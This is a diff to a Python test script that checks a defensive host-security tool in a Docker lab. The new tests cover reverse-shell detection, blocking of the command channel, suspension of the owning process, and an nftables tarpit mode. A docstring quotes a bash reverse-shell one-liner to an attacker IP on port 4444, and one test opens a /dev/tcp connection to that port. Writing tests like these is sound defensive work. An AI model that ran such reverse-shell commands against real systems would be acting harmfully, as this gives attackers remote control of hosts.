@@ -6,6 +6,9 @@ Modos (los orquesta lab/docker-lab.sh con un contenedor atacante separado):
   net-scan <ip>     L1: verifica detección del escaneo y bloqueo nft de la IP
   release           libera los bloqueos Tier 1 (entre fases de red)
   net-brute <ip>    L2: verifica detección de fuerza bruta y bloqueo nft
+  net-revsh <ip>    L6: detección + canal bloqueado + SOLO el dueño suspendido
+  net-revsh-verify <ip>  L6: el canal sigue muerto sin suspensión y la reversión lo revive
+  net-tarpit <ip>   Tarpit (Core): estrangula la IP del escaneo en vez de bloquearla
   levels            L4, L5, L7, L8, L9 en la víctima + scoreboard
   all               prep + levels (modo clásico de contenedor único)
 
@@ -13,6 +16,7 @@ Cada modo imprime [PASS]/[FAIL] por nivel y sale != 0 si falla.
 """
 import json
 import os
+import signal
 import socket
 import subprocess
 import sys
@@ -31,6 +35,11 @@ score = []
 def report(level, ok, evidence):
     score.append(ok)
     print(f"[{'PASS' if ok else 'FAIL'}] nivel {level}: {evidence}")
+    if not ok:  # un FAIL debe explicarse solo: así se distinguió B9 de un problema de reloj
+        print(f"  acciones Tier 1 en la última hora: "
+              f"{len(config.read_json(config.state_dir() / 'tier1_actions.json', []))}")
+        for i in incidents()[-6:]:
+            print(f"  · {(i.get('detail') or '')[:70]} => {(i.get('status') or '')[:70]}")
 
 
 def sh(cmd, **kw):
@@ -71,7 +80,6 @@ def prep():
     print("── preparación: verificar listeners 9001-9012 + learn ×2 + seal + canario ──")
     # Los listeners se siembran en el entrypoint del contenedor (docker exec mata el
     # árbol de procesos al salir — B7). Aquí se VERIFICA, con honestidad si faltan.
-    import socket
     dead = [p for p in range(9001, 9013)
             if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(("127.0.0.1", p)) != 0]
     if dead:
@@ -114,6 +122,114 @@ def net_brute(ip):
     ok = found and blocked
     print(f"[{'PASS' if ok else 'FAIL'}] nivel 2: fuerza bruta detectada={found} · "
           f"IP en block_ipv4={blocked}")
+    return 0 if ok else 1
+
+
+C2_PORT = 4444
+
+
+def _c2_conns(ip):
+    from arx.modules import recon
+    return [c for c in recon.connection_owners()
+            if c.get("remote_ip") == ip and c.get("remote_port") == C2_PORT
+            and c.get("state") == "ESTABLISHED"]
+
+
+def _proc_state(pid):
+    return sh(["ps", "-o", "stat=", "-p", str(pid)]).stdout.strip()
+
+
+def _wait_file(path, seconds):
+    deadline = time.monotonic() + seconds
+    while time.monotonic() < deadline:
+        if os.path.exists(path):
+            return True
+        time.sleep(0.25)
+    return os.path.exists(path)
+
+
+def net_revsh(ip):
+    """L6, fase 1: `bash -i >& /dev/tcp/<atacante>/4444` lanzado por docker-lab.sh.
+
+    Pasa si la orden previa del atacante se ejecutó (el shell es real), Arx lo detecta,
+    el canal queda en c2_out4, el dueño queda suspendido y otro bash del host NO (B9).
+    """
+    owner = None
+    for _ in range(40):  # esperar a que el socket C2 se establezca (≤10 s)
+        owner = next((c["pid"] for c in _c2_conns(ip) if c.get("pid")), None)
+        if owner:
+            break
+        time.sleep(0.25)
+    if not owner:
+        report(6, False, "el reverse shell no llegó a establecer el canal C2")
+        return 1
+    executed = _wait_file("/tmp/c2-antes", 5)
+    bystander = subprocess.Popen(["bash", "-c", "while :; do sleep 1; done"])
+    time.sleep(0.5)
+    sweep()
+    # el incidente se registra con kind="incident"; el tipo del hallazgo va en el detalle
+    detected = any("conexión saliente" in i.get("detail", "") and ip in i.get("detail", "")
+                   for i in incidents())
+    blocked = f"{ip} . {C2_PORT}" in _nft_set("c2_out4")
+    suspended = _proc_state(owner).startswith("T")
+    bystander_ok = not _proc_state(bystander.pid).startswith("T")
+    bystander.kill()
+    report(6, executed and detected and blocked and suspended and bystander_ok,
+           f"orden previa ejecutada={executed} · detectado={detected} · "
+           f"canal bloqueado={blocked} · dueño suspendido={suspended} · "
+           f"otro bash intacto={bystander_ok}")
+    return 0 if all(score) else 1
+
+
+def net_revsh_verify(ip):
+    """L6, fase 2: el corte es real por sí solo y la reversión lo deshace de verdad.
+
+    Se descongela el shell para probar el canal sin la ayuda de la suspensión: la orden
+    enviada tras el bloqueo no debe llegar ni debe poder reconectar. Al expirar, la orden
+    retenida debe llegar por retransmisión TCP: esa es la prueba de que es reversible.
+    """
+    pids = [c["pid"] for c in _c2_conns(ip) if c.get("pid")]
+    for pid in pids:
+        os.kill(pid, signal.SIGCONT)
+    time.sleep(4)
+    leaked = os.path.exists("/tmp/c2-despues")
+    reconnect = sh(["timeout", "3", "bash", "-c",
+                    f"exec 3<>/dev/tcp/{ip}/{C2_PORT}"]).returncode == 0
+    release()
+    unblocked = f"{ip} . {C2_PORT}" not in _nft_set("c2_out4")
+    resumed = _wait_file("/tmp/c2-despues", 30)
+    for pid in pids:  # limpieza: el shell del lab no debe seguir vivo en los niveles siguientes
+        try:
+            os.kill(pid, signal.SIGKILL)
+        except OSError:
+            pass
+    report(6, bool(pids) and not leaked and not reconnect and unblocked and resumed,
+           f"orden durante el bloqueo llegó={leaked} · reconexión posible={reconnect} · "
+           f"bloqueo retirado al expirar={unblocked} · orden retenida llegó tras revertir={resumed}")
+    return 0 if all(score) else 1
+
+
+def net_tarpit(ip):
+    """Tarpit (Core): con política ip_response='tarpit', Arx ESTRANGULA la IP del escaneo
+    (rate-limit per-IP en nftables) en vez de bloquearla. Pizarra limpia: el tarpit es un
+    PRIMER contacto, no una reaparición tras bloqueo. Reutiliza el escaneo real del L1.
+    """
+    from arx.modules import response
+    for path in (response._findings_path(), response._blocks_path(), response._actions_path()):
+        config.write_json(path, {} if "findings" in path.name else [])
+    cfg = config.load_config()
+    cfg["ip_response"] = "tarpit"       # política Core: estrangular, no bloquear
+    config.save_config(cfg)
+    sweep()
+    tarpitted = ip in _nft_set("tarpit4")
+    not_blocked = ip not in _nft_set("block_ipv4")
+    throttled = "@tarpit4" in sh(["nft", "list", "chain", "inet", "arx", "input"]).stdout
+    ok = tarpitted and not_blocked and throttled
+    print(f"[{'PASS' if ok else 'FAIL'}] tarpit (Core): estrangulada en tarpit4={tarpitted} · "
+          f"NO bloqueada={not_blocked} · reglas rate-limit per-IP activas={throttled}")
+    cfg["ip_response"] = "block"        # restaurar el modo por defecto
+    config.save_config(cfg)
+    release()                            # limpiar el estrangulamiento tras la prueba
     return 0 if ok else 1
 
 
@@ -191,7 +307,7 @@ def levels():
         report(9, False, "no se pudo plantar el canario en el lab")
 
     print(f"\n══ SCOREBOARD: {sum(score)}/{len(score)} niveles superados ══")
-    print("(nivel 6 — anomalía de conexión saliente: GAP documentado en lab/README.md)")
+    print("(niveles 1, 2 y 6 se validan en la fase de red: ver sus líneas arriba)")
     return 0 if all(score) else 1
 
 
@@ -205,6 +321,12 @@ def main():
         return release()
     if mode == "net-brute":
         return net_brute(sys.argv[2])
+    if mode == "net-revsh":
+        return net_revsh(sys.argv[2])
+    if mode == "net-revsh-verify":
+        return net_revsh_verify(sys.argv[2])
+    if mode == "net-tarpit":
+        return net_tarpit(sys.argv[2])
     if mode == "levels":
         return levels()
     prep()
